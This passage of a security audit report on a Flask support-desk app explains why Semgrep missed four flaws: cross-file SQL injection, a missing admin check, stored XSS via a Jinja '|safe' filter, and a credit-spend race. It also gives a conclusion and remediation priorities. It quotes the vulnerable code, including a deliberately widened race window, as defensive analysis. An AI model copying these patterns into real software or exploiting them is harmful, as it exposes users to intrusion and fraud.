these are already documented above as full findings — F-03, F-04, F-05, F-07 — and are reproduced
here specifically to call out the *scanner blind spot*.)

### FN-1 — SQL Injection in `search_tickets` (string concatenation)
- **Location:** `models.py:117` (also referenced as Finding F-03).
- **Vulnerability:** `"SELECT ... LIKE '%" + term + "%'"` built by concatenating request input.
- **Why Semgrep missed it:** The Semgrep SQL-injection/Flask packs primarily track taint from a
  Flask request object to a database `execute()` call *within the same function/file*. Here the
  tainted value (`request.args["q"]`) is read in `app.py:search()`, passed as a plain function
  argument across a module boundary into `models.search_tickets()`, and only there concatenated into
  SQL. This **cross-function / cross-file (interprocedural) data flow** is not connected by the
  community rules — the source and sink are in different files with no taint-propagation rule linking
  them — so the concatenated query was not flagged. A human reading the data layer immediately sees
  the unparameterized string build.

### FN-2 — Broken Access Control / Missing Admin Check on `/admin/reports`
- **Location:** `app.py:207–213` (also Finding F-04).
- **Vulnerability:** Authenticated-but-not-authorized users can reach the admin reports page; no
  `role == "admin"` check.
- **Why Semgrep missed it:** This is a **business-logic / authorization flaw**, not a syntactic
  pattern. There is no dangerous API call or tainted sink to match — the vulnerability is the
  *absence* of a check. SAST tools have no model of "this route is privileged and requires role X,"
  so missing-authorization defects are invisible to pattern-based scanning and require human
  understanding of the app's access-control intent.

### FN-3 — Stored XSS via Jinja `|safe` on comment body
- **Location:** `templates/ticket.html:35` (also Finding F-05).
- **Vulnerability:** `{{ c.body|safe }}` renders attacker-controlled, stored comment HTML without
  escaping.
- **Why Semgrep missed it:** The unsafe sink lives in a **Jinja2 template**, and the dangerous data
  originates two steps away: `request.form["body"]` in `app.py` → written to the DB in `models.py` →
  read back and rendered in the template. The community Python/Flask packs used do not perform
  taint analysis *through the database and into template `|safe` filters*. The stored (second-order)
  nature plus the template-language sink put it outside the scanner's reach; manual review spotted
  the `|safe` filter on user-controlled content immediately.

### FN-4 — TOCTOU Race Condition in `escalate` (credit double-spend)
- **Location:** `app.py:170–182` (function `escalate()`), specifically the check-then-act around the
  `time.sleep(0.2)` at line 179.
- **Vulnerability:** Escalation credits are read (`get_credits`), validated (`balance < cost`), then
  — after a deliberate delay — written back (`set_credits(balance - cost)`). The read/check and the
  decrement are not atomic, so concurrent requests all read the same starting balance and each
  succeed, letting a user escalate many tickets / overspend credits beyond their balance (a
  **Time-Of-Check-To-Time-Of-Use** business-logic race).
  ```python
  176    balance = models.get_credits(user["id"])
  177    if balance is None or balance < cost:
  178        return jsonify({"error": "not enough escalation credits"}), 400
  179    time.sleep(0.2)                                  # widened race window
  180    models.set_credits(user["id"], balance - cost)  # non-atomic decrement
  ```
- **Why Semgrep missed it:** Race conditions are **temporal, multi-request concurrency defects** with
  no characteristic code token to match. SAST analyzes a single static snapshot of control/data flow
  and has no concept of two requests interleaving on shared state. Detecting this requires reasoning
  about atomicity and concurrent execution — only manual review (or dynamic/load testing) finds it.
  *Remediation:* perform the check-and-decrement atomically in one SQL statement, e.g.
  `UPDATE users SET escalation_credits = escalation_credits - ? WHERE id = ? AND escalation_credits >= ?`
  and treat a zero-row update as "insufficient credits"; remove the `time.sleep`.

---

## 6. Conclusion

The Scaler Support Desk application contains a dense set of high-impact vulnerabilities spanning the
OWASP Top 10: injection (SQL, OS command, code/`eval`), broken access control (missing admin
authorization and IDOR), cryptographic failures (unsalted MD5, hardcoded secret key and tokens),
cross-site scripting (stored and reflected), insecure design (insecure file upload, debug mode, a
credit-spend race), and security misconfiguration / information disclosure.

The combined SAST + manual approach was essential. Semgrep was highly effective at flagging
**syntactic, single-function sinks** — `eval`, `os.popen`, MD5, `debug=True`, and raw-HTML responses —
which map directly onto findings F-01, F-02, F-09, F-11, and F-12. However, the most damaging issues
in this codebase were **invisible to the scanner**: interprocedural SQL injection (FN-1), missing
authorization (FN-2), template-level stored XSS via `|safe` (FN-3), and a concurrency race (FN-4).
These required a human to model data flow across files, understand the application's intended
access-control rules, and reason about concurrent execution.

**Priority remediation order:** (1) eliminate the RCE vectors F-01 and F-02 immediately; (2) fix the
authentication/authorization foundations — hardcoded `SECRET_KEY` (F-08), missing admin check (F-04),
and IDOR (F-07); (3) parameterize all SQL (F-03, F-13) and remove the `|safe` XSS sink (F-05); then
(4) address upload validation, password hashing, debug mode, path traversal, and error verbosity.
The application should not be exposed to untrusted users until at least the Critical and High findings
are resolved.

---

### Appendix A — Tooling

- **Semgrep:** v1.168.0, rule packs `p/python`, `p/flask`, `p/secrets`, `p/command-injection`,
  `p/sql-injection`. Raw output: `semgrep_output.txt` and `semgrep_output.json` (15 raw results).
- **Manual review:** full line-by-line read of `app.py`, `models.py`, `utils.py`, and all templates.

### Appendix B — Semgrep raw result map (tool → finding)

| Semgrep rule (short) | File:Line | Mapped finding |
|---|---|---|
| `eval-injection` / `user-eval` | app.py:162,164 | F-01 (+F-15) |
| `dangerous-system-call` | app.py:191,203 | F-02 |
| `raw-html-format` / `directly-returned-format-string` | app.py:192,204 | F-09 |
| `avoid_app_run_with_bad_host` / `debug-enabled` | app.py:220 | F-12 |
| `insecure-hash-algorithm-md5` / `md5-used-as-password` | utils.py:7,15 | F-11 |

*(Findings F-03, F-04, F-05, F-06, F-07, F-08, F-10, F-13, F-14 and all four False Negatives were
identified by manual review and are not present in the Semgrep output — see Section 5.)*
